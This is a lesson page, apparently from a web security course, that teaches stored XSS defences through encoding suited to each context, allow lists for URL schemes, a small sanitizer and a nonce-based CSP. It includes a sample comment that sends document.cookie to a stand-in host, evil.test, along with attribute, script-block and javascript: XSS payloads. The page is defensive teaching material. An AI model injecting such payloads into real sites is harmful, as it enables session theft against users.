@@ -1,0 +1,145 @@
+---
+title: XSS and CSP
+summary: A customer's comment with a script in it is served to other customers. We use a real HTML parser to see how a browser builds an element nobody wrote, in the page text, in an attribute and in a script block, and see how encoding for the right place, an allow list of URLs and a nonce based Content Security Policy each cover a different part.
+facts:
+  - "Run in exercises/09_xss.py: Python's html.parser builds whether a page has an element or an event attribute nobody wrote, with and without encoding, in 3 places, 12 cases in the lab in all."
+  - "The results for the Content Security Policy are a model of the rules (nonce, unsafe-inline) written in the exercise. They were not tried in a real browser, and no script was actually run in the exercise."
+  - "The book is Web Application Security chapters 10 and 22. Not run: DOM-based XSS and mutation XSS, which depend on the browser."
+order: 9
+phase: C
+level: 3
+stage: sprout
+format: steps
+requires: [injection]
+updated: 2026-11-18
+---
+
+import Step from '../../../../components/Step.astro';
+import Callout from '../../../../components/Callout.astro';
+import Question from '../../../../components/Question';
+import XssLab from '../../../../components/labs/app-security/XssLab';
+
+<Step>
+
+## A comment with a script in it
+
+Mr. A's shop has a product review page. A customer types a comment and the page shows it to others (run: `exercises/09_xss.py`).
+
+```python
+def page_naive(comment):
+    return f"<html><body><h1>Reviews</h1><p>{comment}</p></body></html>"
+
+COMMENT = '<script>fetch("https://evil.test/?c="+document.cookie)</script>'
+```
+
+If someone types the line above as a comment, the HTML now has a `<script>` inside the paragraph. When the browser of the next customer opens the page, it does not know the script came from a comment. It sees part of the shop's own page and runs it with the rights of that site, which can read a cookie with no `HttpOnly`, as we saw in the lesson on sessions. This is **XSS (cross-site scripting)** in its stored form, because the comment is kept and then served to everyone (book: Web Application Security chapter 10 page 121).
+
+The exercise has no real browser, so it uses the HTML parser of Python, which produces the same kind of events a browser produces (start tags and attributes). The result is that the page as written has an extra `script` element nobody wrote, while the one that went through `html.escape` has none.
+
+The cause is the same as in the last lesson: the user's text became code. This time the reader is a browser and not a database, and the fix follows the same principle: **encode on output**, so the text stays text.
+
+</Step>
+
+<Step>
+
+## Encode for the place the text lands
+
+`html.escape` turns `< > & " '` into `&lt; &gt; &amp; &quot; &#x27;`, which the exercise asserts. Used on the content of a paragraph, no script is built, and the comment is shown to the reader as text, as typed.
+
+But the right encoding depends on **where** in the page the text lands. Pick the places one at a time in the lab below, use the attack text for that place, and switch the encoding between not doing it and doing it right for the place. See that the browser builds different things in the three places. The highlighted part of the page is the user's text.
+
+<XssLab client:visible lang="en" />
+
+The first place is HTML content, which is the easy case above. The second is the value of an attribute wrapped in `"`. The attack text `" onfocus="alert(1)" autofocus="` closes the value with its first `"` and so `onfocus` becomes a real new attribute of the `<input>`. `html.escape` turns the `"` into `&quot;` and the value is not closed early. The exercise also checks that when the value has no `"` around it, a single space can close it, so `html.escape` alone is not enough, and we must always put the quotes around the value.
+
+The third place is a value put into a `<script>` block. Here `html.escape` does not work the way one would think, because the browser reads what is inside `<script>` as JavaScript and not as HTML that has to be decoded first. The right way is to write the value as a JavaScript string with `json.dumps` and also write `<` as `\u003c`, because the text `</script>` inside a string closes the block early even within quotation marks. The exercise tried the value `</script><img src=x onerror=alert(1)>`. The parser sees an `<img onerror=...>` appear when `<` is not written as `\u003c`, and does not when it is (book: Web Application Security chapter 22 page 240 on HTML entity encoding).
+
+</Step>
+
+<Step kind="question">
+
+<Question
+  client:visible
+  lang="en"
+  q="A team uses html.escape on a value placed inside the page's <script> block, because escaped means safe. Which statement is most right?"
+  options={['Safe, because html.escape prevents XSS in every place', 'Not certain, because encoding must match the place. In a script block the content is read as JavaScript, so the value should be written with json.dumps and the < escaped', 'Safe if the value holds only digits']}
+  answer={1}
+  why="One HTML page holds several contexts (content, attributes, script, URLs), and each has its own characters that let text break out. The exercise shows the difference in the lab: in the js place, without writing < as `\u003c`, the parser sees an img with onerror. The last option, that digits are safe, is true in practice, but only if the type of the value really is checked on the server."
+/>
+
+</Step>
+
+<Step>
+
+## A link that is still dangerous after escaping
+
+There is one more case where encoding does not help at all, and that is the URL of a link. If a user puts his own web address in his profile and we make it `<a href="...">`, he can enter `javascript:alert(document.cookie)`, which has no character that `html.escape` converts. The exercise checks that the resulting `href` is still entirely `javascript:...`, so it is still a link that runs a script when clicked.
+
+The fix that works is an **allow list** of schemes. The exercise allows only `http`, `https` and relative links (no scheme). A `javascript:` link is refused, including the form written in capitals with a space in front (`  JaVaScRiPt:alert(1)`), which a browser reads the same as before (book: Web Application Security chapter 22 page 239 on sanitizing hyperlinks).
+
+</Step>
+
+<Step>
+
+## If users must be allowed some HTML
+
+Some sites want users to write bold with `<b>`. Encoding everything is not enough here, because we want `<b>` to work. The way is an **allow-list sanitizer**. The exercise writes a small one that keeps only `<b>` and `<i>` and drops every attribute. The text it was fed had `<b onclick="x()">`, an `<img onerror=...>` and a `<script>`. The result is `<b>shop</b>` with no event attribute left.
+
+A caution that the exercise itself checks: the text inside the dropped `<script>alert(2)</script>` is left as plain text `alert(2)`, which does not run, but it shows that a sanitizer written by hand always has odd cases that slip. In real work we use a sanitizer that people keep maintaining. A harder matter such as mutation XSS, where the browser repairs broken HTML into something dangerous, was not run in this lesson (book: Web Application Security chapter 10 page 128).
+
+</Step>
+
+<Step>
+
+## Another wall: Content Security Policy
+
+Every rule above must not fail even once. A **CSP** is another wall. The server sends a header that tells the browser which scripts may run, and if a planted script does not meet the condition, the browser does not run it.
+
+```text
+Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-ulO-UaueGw7spEFMRaC5GQ'; object-src 'none'
+```
+
+A `nonce` is a random value the server makes fresh for every response and puts in the `<script nonce="...">` of our own scripts. A script planted by an attacker has no valid nonce, so it does not run. What the exercise asserts with a model of the rule: our own script, carrying the nonce, runs. A planted script with no nonce is blocked. An attacker who guesses a nonce, or reuses one from an old page, fails, because the value changes on every response (a nonce is 22 characters, or 128 bits). But if the policy has `'unsafe-inline'` and no nonce, a planted script runs again. Switch the CSP option in the lab above to see it (book: Web Application Security chapter 22 page 242).
+
+A CSP is a backup layer, not a replacement for encoding. If we lean on it alone, the user's text still turns into HTML inside the page, and only the script is stopped from running.
+
+<Callout type="warn" title="The CSP results in the exercise are a model">
+
+The exercise has no real browser. The rules of nonce and unsafe-inline are written as code from what the book and the documentation say. The result says that if a browser follows these rules, this is what happens. It was not confirmed on Chrome or Firefox.
+
+</Callout>
+
+</Step>
+
+<Step kind="question">
+
+<Question
+  client:visible
+  lang="en"
+  q="A site already has a nonce based CSP, so the team stops running html.escape on users' comments, because a planted script would not run anyway. Which statement is right?"
+  options={['Right, because a CSP is safe enough', 'It should not. A CSP is a backup layer. User text that becomes HTML can still do other things, such as planting a fake form or changing the page, and a CSP can be set up wrongly', 'Right, if the CSP has unsafe-inline']}
+  answer={1}
+  why="The aim is that a user's text is not HTML in a place we did not intend, which encoding does at the cause. A CSP covers only what the policy talks about, and it breaks when configured wrongly: add unsafe-inline and the policy lets planted scripts run again, which the exercise shows directly."
+/>
+
+</Step>
+
+<Step>
+
+## Where this lesson comes from
+
+| Statement | Source |
+|---|---|
+| The page built directly from a comment has a `script` element nobody wrote, and the page that went through `html.escape` does not | ran: `exercises/09_xss.py` (Python's parser, not a real browser) |
+| `html.escape` turns `< > & " '` into the stated forms | ran: `exercises/09_xss.py` |
+| A value that closes an attribute with `"` makes a new event attribute, and `html.escape` stops it when the value is inside `"` | ran: `exercises/09_xss.py` |
+| A value in a script block with `</script>` breaks out unless `<` is written as `\u003c` | ran: `exercises/09_xss.py` |
+| HTML entity encoding | book: Web Application Security chapter 22 page 240 |
+| A `javascript:` link passes through `html.escape`, and an allow list of schemes stops it | ran: `exercises/09_xss.py` and book: Web Application Security chapter 22 page 239 |
+| An allow-list sanitizer keeps `<b>` and drops attributes and other elements | ran: `exercises/09_xss.py` |
+| Stored XSS and mutation XSS | book: Web Application Security chapter 10 pages 121 and 128 (mutation was not run) |
+| A nonce based CSP lets our script run, blocks a planted one, and unsafe-inline lets it run again | ran: `exercises/09_xss.py` (a model of the rule) and book: Web Application Security chapter 22 page 242 |
+| Whether a browser follows the CSP rules of the model | not run on a real browser |
+| DOM-based XSS | not run |
+
+</Step>
